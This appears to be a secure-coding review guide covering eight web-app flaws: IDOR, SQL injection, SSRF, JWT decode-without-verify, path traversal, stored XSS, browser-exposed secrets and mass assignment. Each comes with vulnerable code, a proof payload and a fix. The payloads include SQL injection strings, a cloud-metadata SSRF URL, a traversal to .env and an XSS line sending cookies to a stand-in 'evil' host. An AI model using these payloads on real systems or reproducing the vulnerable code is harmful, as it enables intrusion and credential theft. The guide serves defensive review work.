# Worked Findings — vulnerable code, the proof, the fix

Eight findings that come up in most web-app reviews, each with the
vulnerable code, how an attacker uses it (the evidence a finding needs),
and the fix. SEC IDs refer to `general-checklist.md`. Validate every
fix with a test that would have caught the original.

## 1. IDOR — reading someone else's record

```ts
app.get("/api/invoices/:id", requireAuth, async (req, res) => {
  res.json(await db.invoice.findUnique({ where: { id: req.params.id } }));
});
```

**Proof:** logged in as user A, `GET /api/invoices/<id of B's invoice>` →
200 with B's data. IDs are sequential or leak in URLs/emails.

**Fix:** scope every query to the caller.

```ts
const invoice = await db.invoice.findFirst({ where: { id: req.params.id, userId: req.user.id } });
if (!invoice) return res.sendStatus(404);    // 404, not 403: don't confirm it exists
res.json(invoice);
```

**Test:** two users; A requests B's invoice → 404.

## 2. SQL injection through a raw query

```ts
const rows = await db.$queryRawUnsafe(`SELECT * FROM products WHERE name ILIKE '%${q}%' ORDER BY ${sort}`);
```

**Proof:** `q = "' OR 1=1 --"` returns everything; `sort = "(SELECT pg_sleep(5))"` delays the response.

**Fix:** parameters for values, an allow-list for identifiers.

```ts
const SORTS = { name: Prisma.sql`name`, price: Prisma.sql`price` } as const;
const order = SORTS[sort as keyof typeof SORTS] ?? SORTS.name;
const rows = await db.$queryRaw`SELECT * FROM products WHERE name ILIKE ${"%" + q + "%"} ORDER BY ${order}`;
```

## 3. SSRF — fetching a user-supplied URL

```ts
app.post("/api/preview", async (req, res) => {
  const html = await (await fetch(req.body.url)).text();
  res.json(parseOpenGraph(html));
});
```

**Proof:** `url = "http://169.254.169.254/latest/meta-data/"` (cloud
metadata) or `http://localhost:6379/` reaches internal services.

**Fix:** allow only http(s), resolve the host, reject private ranges,
don't follow redirects blindly, cap size and time.

```ts
import { lookup } from "node:dns/promises";
import ipaddr from "ipaddr.js";

async function safeUrl(raw: string) {
  const u = new URL(raw);
  if (!["http:", "https:"].includes(u.protocol)) throw new Error("scheme");
  const { address } = await lookup(u.hostname);
  if (ipaddr.parse(address).range() !== "unicast") throw new Error("private address");
  return u;
}
const res = await fetch(await safeUrl(req.body.url), { redirect: "manual", signal: AbortSignal.timeout(5000) });
```

(Re-check after redirects; better still, fetch through an egress proxy
that blocks private ranges.)

## 4. JWT verified wrongly

```ts
const payload = jwt.decode(token);            // decode ≠ verify
if (payload.role === "admin") next();
```

**Proof:** craft a token with `{"role":"admin"}` and any signature.

**Fix:**

```ts
const payload = jwt.verify(token, process.env.JWT_SECRET!, { algorithms: ["HS256"], issuer: "kasirku", audience: "api" });
```

Pin the algorithm, check `exp`, issuer and audience; keep role checks
server-side from the verified payload or, better, from the database.

## 5. Path traversal in a download route

```ts
app.get("/files/:name", (req, res) => res.sendFile(path.join(UPLOAD_DIR, req.params.name)));
```

**Proof:** `/files/..%2F..%2F.env` returns the env file.

**Fix:**

```ts
const target = path.resolve(UPLOAD_DIR, req.params.name);
if (!target.startsWith(path.resolve(UPLOAD_DIR) + path.sep)) return res.sendStatus(400);
res.sendFile(target);
```

Better: store files by generated ID and look up the path in the database.

## 6. Stored XSS through rich text

```tsx
<div dangerouslySetInnerHTML={{ __html: product.description }} />
```

**Proof:** a seller saves `<img src=x onerror="fetch('//evil?c='+document.cookie)">`.

**Fix:** sanitise on output (and ideally on input) with an allow-list.

```tsx
import DOMPurify from "isomorphic-dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(product.description, { ALLOWED_TAGS: ["p", "b", "i", "ul", "ol", "li", "a"], ALLOWED_ATTR: ["href"] }) }} />
```

Plus a Content-Security-Policy without `unsafe-inline` scripts, and
`HttpOnly` session cookies so cookies aren't readable from scripts.

## 7. Secret shipped to the browser

```ts
// next.config / client code
const stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET_KEY!);
```

**Proof:** `rg -o "sk_(live|test)_[A-Za-z0-9]+" .next/static` finds the key
in the built JS.

**Fix:** secret keys only in server code, never under a `NEXT_PUBLIC_` /
`VITE_` / `REACT_APP_` prefix. Rotate the exposed key — removing it from
the code doesn't revoke it.

## 8. Mass assignment

```ts
await db.user.update({ where: { id: req.user.id }, data: req.body });
```

**Proof:** `PATCH /api/me {"role":"admin","balance":999999}`.

**Fix:** a schema that lists only editable fields.

```ts
const ProfileUpdate = z.object({ name: z.string().min(1).max(80), phone: z.string().regex(/^08\d{8,11}$/) }).strict();
await db.user.update({ where: { id: req.user.id }, data: ProfileUpdate.parse(req.body) });
```

## Quick sweeps that find these

```bash
rg -n "\$queryRawUnsafe|\.raw\(|execute\(f?\"|cursor\.execute\(.*%" src
rg -n "dangerouslySetInnerHTML|v-html|innerHTML\s*=" src
rg -n "jwt\.decode\(|verify\(.*algorithms" src
rg -n "NEXT_PUBLIC_.*(SECRET|KEY|TOKEN)|VITE_.*SECRET" .
rg -n "sendFile\(|createReadStream\(|open\(.*request" src
rg -n "data: req\.body|\*\*request\.(json|form)|update\(.*\*\*" src
rg -n "fetch\(req\.(body|query)|requests\.get\(request\." src
npm audit --omit=dev; pip-audit; govulncheck ./...
```

Each hit is a lead; a finding needs the proof step above.

## Finding format

```markdown
### SEC-04 IDOR on invoices — CRITICAL (confirmed)
Where: src/routes/invoices.ts:12
Proof: as user A (id 7) GET /api/invoices/1043 (owned by user 9) → 200 with B's address and total.
Impact: any customer can read every invoice by iterating IDs.
Fix: scope the query by userId (diff above); return 404.
Test: invoices.access.test.ts — "user cannot read another user's invoice".
```
